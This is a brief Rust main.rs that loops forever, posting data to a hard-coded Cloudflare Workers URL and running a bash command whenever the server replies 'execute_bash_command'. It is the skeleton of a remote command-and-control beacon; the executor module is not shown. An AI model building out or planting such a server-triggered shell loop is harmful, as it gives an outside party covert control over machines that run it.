// main.rs
mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";
    loop {
        // Send data to the Worker
        let response = worker_communication::send_data_request(&worker_url, "Sample data").await;

        // Check the response from the Worker
        let request_successful = response == "execute_bash_command";
        if request_successful {
            command_executor::execute_bash_command(true);
        } else {
            command_executor::execute_bash_command(false);
        }

        // Add more conditions or logic to handle different commands
    }
}